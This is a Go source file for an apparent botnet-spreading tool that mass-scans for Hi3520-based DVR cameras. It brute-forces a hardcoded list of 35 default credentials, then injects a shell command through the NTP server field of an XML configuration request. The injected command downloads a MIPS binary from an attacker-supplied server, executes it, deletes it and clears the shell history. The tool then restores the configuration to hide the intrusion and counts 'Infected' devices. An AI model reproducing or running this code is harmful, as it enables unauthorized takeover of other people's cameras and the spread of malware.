package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

/* ============================================================================
 * DVR EXPLOIT SCANNER - CCTV/DVR Camera Compromise
 * ============================================================================
 * Exploits DVR cameras via HTTP Basic Auth + XML configuration injection
 * Targets: Hi3520-based DVR cameras (common in CCTV systems)
 * Method: POST /dvr/cmd or /cn/cmd with malicious NTP server config
 * Credentials: 35 username/password combinations
 * Payload: Downloads and executes binary via command injection
 * Global coverage: All regions with CCTV/DVR deployments
 * ============================================================================ */

// DVR credentials - matches Python version
var dvrCredentials = []string{
	"admin:686868",
	"admin:baogiaan",
	"admin:555555",
	"admin123:admin123",
	"admin:888888",
	"root:toor",
	"toor:toor",
	"toor:root",
	"admin:admin@123",
	"admin:123456789",
	"root:admin",
	"guest:guest",
	"guest:123456",
	"report:8Jg0SR8K50",
	"admin:admin",
	"admin:123456",
	"root:123456",
	"admin:user",
	"admin:1234",
	"admin:password",
	"admin:12345",
	"admin:0000",
	"admin:1111",
	"admin:1234567890",
	"admin:123",
	"admin:",
	"admin:666666",
	"admin:admin123",
	"admin:administrator",
	"administrator:password",
	"admin:p@ssword",
	"admin:12345678",
	"root:root",
	"support:support",
	"user:user",
}

// Exploit paths
var exploitPaths = []string{"/dvr/cmd", "/cn/cmd"}

// Server IP for payload
var serverIP string

type DVRResult struct {
	IP       string
	Port     string
	Username string
	Password string
	Path     string
	Success  bool
}

type DVRStats struct {
	Total   int64
	Found   int64
	Logins  int64
	Vuln    int64
	Cleaned int64
}

var stats DVRStats

func checkDevice(target string, timeout time.Duration) (bool, string) {
	host, port, err := parseTarget(target)
	if err != nil {
		return false, ""
	}

	conn, err := net.DialTimeout("tcp", host+":"+port, timeout)
	if err != nil {
		return false, ""
	}
	defer conn.Close()

	// Send HTTP request to check for 401 Unauthorized
	payload := fmt.Sprintf(
		"GET / HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: Linux Gnu (cow)\r\n"+
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
			"Accept-Language: en-GB,en;q=0.5\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Connection: close\r\n"+
			"Upgrade-Insecure-Requests: 1\r\n\r\n",
		target)

	conn.SetWriteDeadline(time.Now().Add(timeout))
	conn.Write([]byte(payload))

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 512)
	n, err := conn.Read(buf)
	if err != nil {
		return false, ""
	}

	response := string(buf[:n])
	if strings.Contains(response, "401 Unauthorized") && strings.Contains(response, "Basic realm=") {
		return true, ""
	}

	return false, ""
}

func tryLogin(target string, timeout time.Duration) (bool, string, string) {
	host, port, err := parseTarget(target)
	if err != nil {
		return false, "", ""
	}

	for _, cred := range dvrCredentials {
		parts := strings.SplitN(cred, ":", 2)
		if len(parts) != 2 {
			continue
		}
		username, password := parts[0], parts[1]

		conn, err := net.DialTimeout("tcp", host+":"+port, timeout)
		if err != nil {
			continue
		}

		authBase64 := base64.StdEncoding.EncodeToString([]byte(cred))
		payload := fmt.Sprintf(
			"GET / HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"User-Agent: Linux Gnu (cow)\r\n"+
				"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"+
				"Accept-Language: en-GB,en;q=0.5\r\n"+
				"Accept-Encoding: gzip, deflate\r\n"+
				"Connection: close\r\n"+
				"Upgrade-Insecure-Requests: 1\r\n"+
				"Authorization: Basic %s\r\n\r\n",
			target, authBase64)

		conn.SetWriteDeadline(time.Now().Add(timeout))
		conn.Write([]byte(payload))

		conn.SetReadDeadline(time.Now().Add(timeout))
		buf := make([]byte, 2048)
		n, err := conn.Read(buf)
		conn.Close()

		if err != nil {
			continue
		}

		response := string(buf[:n])
		if strings.Contains(response, "HTTP/1.1 200") || strings.Contains(response, "HTTP/1.0 200") {
			return true, username, password
		}
	}

	return false, "", ""
}

func sendExploit(target, username, password string, timeout time.Duration) (bool, string) {
	host, port, err := parseTarget(target)
	if err != nil {
		return false, ""
	}

	authBase64 := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))
	
	// Payload command - downloads and executes binary
	payloadCmd := fmt.Sprintf("cd /tmp || cd /run || cd /; wget %s/bins/axis.mips; chmod 777 axis.mips; sh axis.mips; rm -rf axis.mips; history -c", serverIP)
	
	// XML configuration with command injection
	xmlPayload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov&%s;echo DONE"/></Service></DVR>]]></SetConfiguration></DVR>`, payloadCmd)
	
	cntLenTotal := 292 + len(payloadCmd)

	for _, path := range exploitPaths {
		conn, err := net.DialTimeout("tcp", host+":"+port, timeout)
		if err != nil {
			continue
		}

		exploitPayload := fmt.Sprintf(
			"POST %s HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Accept-Encoding: gzip, deflate\r\n"+
				"Content-Length: %d\r\n"+
				"Authorization: Basic %s\r\n"+
				"User-Agent: Linux Gnu (cow)\r\n"+
				"Connection: close\r\n\r\n"+
				"%s\r\n\r\n",
			path, target, cntLenTotal, authBase64, xmlPayload)

		conn.SetWriteDeadline(time.Now().Add(timeout))
		conn.Write([]byte(exploitPayload))

		// Wait for exploit to execute
		time.Sleep(10 * time.Second)

		conn.SetReadDeadline(time.Now().Add(timeout))
		buf := make([]byte, 2048)
		n, err := conn.Read(buf)
		conn.Close()

		if err != nil {
			continue
		}

		response := string(buf[:n])
		if strings.Contains(response, "HTTP/1.1 200") || strings.Contains(response, "HTTP/1.0 200") {
			// Exploit successful, now clean up
			cleanupConfig(target, username, password, path, timeout)
			return true, path
		}
	}

	return false, ""
}

func cleanupConfig(target, username, password, path string, timeout time.Duration) {
	host, port, err := parseTarget(target)
	if err != nil {
		return
	}

	authBase64 := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))
	
	// Clean XML configuration (remove injected command)
	cleanXML := `<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><SetConfiguration File="service.xml"><![CDATA[<?xml version="1.0" encoding="UTF-8"?><DVR Platform="Hi3520"><Service><NTP Enable="True" Interval="20000" Server="time.nist.gov"/></Service></DVR>]]></SetConfiguration></DVR>`

	conn, err := net.DialTimeout("tcp", host+":"+port, timeout)
	if err != nil {
		return
	}
	defer conn.Close()

	cleanupPayload := fmt.Sprintf(
		"POST %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Accept-Encoding: gzip, deflate\r\n"+
			"Content-Length: 281\r\n"+
			"Authorization: Basic %s\r\n"+
			"User-Agent: Linux Gnu (cow)\r\n"+
			"Connection: close\r\n\r\n"+
			"%s\r\n\r\n",
		path, target, authBase64, cleanXML)

	conn.SetWriteDeadline(time.Now().Add(timeout))
	conn.Write([]byte(cleanupPayload))

	conn.SetReadDeadline(time.Now().Add(timeout))
	buf := make([]byte, 2048)
	conn.Read(buf)
}

func processTarget(target string, wg *sync.WaitGroup, results chan<- DVRResult, sem chan struct{}) {
	defer wg.Done()

	sem <- struct{}{}
	defer func() { <-sem }()

	atomic.AddInt64(&stats.Total, 1)

	// Check if device is vulnerable (returns 401)
	vulnerable, _ := checkDevice(target, 30*time.Second)
	if !vulnerable {
		return
	}

	atomic.AddInt64(&stats.Found, 1)

	// Try login
	success, username, password := tryLogin(target, 30*time.Second)
	if success {
		atomic.AddInt64(&stats.Logins, 1)
		
		// Send exploit
		exploitSuccess, path := sendExploit(target, username, password, 30*time.Second)
		if exploitSuccess {
			atomic.AddInt64(&stats.Vuln, 1)
			atomic.AddInt64(&stats.Cleaned, 1)
			
			results <- DVRResult{
				IP:       target,
				Port:     "80",
				Username: username,
				Password: password,
				Path:     path,
				Success:  true,
			}
			return
		}
	}

	// Device found but exploit may have failed
	results <- DVRResult{
		IP:   target,
		Port: "80",
		Success: false,
	}
}

func parseTarget(target string) (host, port string, err error) {
	if strings.Contains(target, ":") {
		parts := strings.SplitN(target, ":", 2)
		return parts[0], parts[1], nil
	}
	return target, "80", nil
}

func loadTargets(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		targets = append(targets, line)
	}

	return targets, scanner.Err()
}

func main() {
	if len(os.Args) < 3 {
		fmt.Println("Usage: ./dvr <target-list.txt> <server-ip> [threads]")
		fmt.Println("Example: ./dvr targets.txt 1.2.3.4 500")
		fmt.Println("")
		fmt.Println("Target format:")
		fmt.Println("  - IP addresses: 192.168.1.1")
		fmt.Println("  - IP:Port: 192.168.1.1:80")
		fmt.Println("")
		fmt.Println("Exploits Hi3520-based DVR cameras via XML configuration injection")
		fmt.Println("Payload: wget http://<server>/bins/axis.mips; chmod 777; execute")
		os.Exit(1)
	}

	targetFile := os.Args[1]
	serverIP = os.Args[2]
	threads := 500
	if len(os.Args) > 3 {
		threads, _ = strconv.Atoi(os.Args[3])
	}

	fmt.Printf("[*] AXIS 3.0 DVR Exploit Scanner\n")
	fmt.Printf("[*] Loading targets from: %s\n", targetFile)
	fmt.Printf("[*] Payload server: %s\n", serverIP)
	fmt.Printf("[*] Using %d concurrent threads\n", threads)

	targets, err := loadTargets(targetFile)
	if err != nil {
		fmt.Printf("[-] Error loading targets: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("[*] Loaded %d targets\n", len(targets))
	fmt.Printf("[*] Starting exploitation...\n\n")

	var wg sync.WaitGroup
	results := make(chan DVRResult, 100)
	sem := make(chan struct{}, threads)

	// Start result writer
	go func() {
		f, _ := os.OpenFile("dvr_results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		defer f.Close()

		for result := range results {
			if result.Success {
				line := fmt.Sprintf("%s:%s | %s:%s | Path: %s\n", result.IP, result.Port, result.Username, result.Password, result.Path)
				f.WriteString(line)
				fmt.Printf("[+] DVR EXPLOITED: %s:%s | Login: %s:%s | Path: %s\n", result.IP, result.Port, result.Username, result.Password, result.Path)
			} else {
				fmt.Printf("[+] DVR FOUND: %s:%s (auth required)\n", result.IP, result.Port)
			}
		}
	}()

	// Start status printer
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		i := 0
		for range ticker.C {
			fmt.Printf("[%d's] Total: %d | Found: %d | Logins: %d | Infected: %d | Cleaned: %d          \r",
				i, 
				atomic.LoadInt64(&stats.Total), 
				atomic.LoadInt64(&stats.Found), 
				atomic.LoadInt64(&stats.Logins),
				atomic.LoadInt64(&stats.Vuln),
				atomic.LoadInt64(&stats.Cleaned))
		}
	}()

	startTime := time.Now()

	for _, target := range targets {
		wg.Add(1)
		go processTarget(target, &wg, results, sem)
	}

	wg.Wait()
	close(results)

	elapsed := time.Since(startTime)
	fmt.Printf("\n\n[*] DVR exploitation completed in %s\n", elapsed)
	fmt.Printf("[*] Results saved to: dvr_results.txt\n")
	fmt.Printf("[*] Total: %d | Found: %d | Logins: %d | Infected: %d | Cleaned: %d\n",
		atomic.LoadInt64(&stats.Total),
		atomic.LoadInt64(&stats.Found),
		atomic.LoadInt64(&stats.Logins),
		atomic.LoadInt64(&stats.Vuln),
		atomic.LoadInt64(&stats.Cleaned))
}
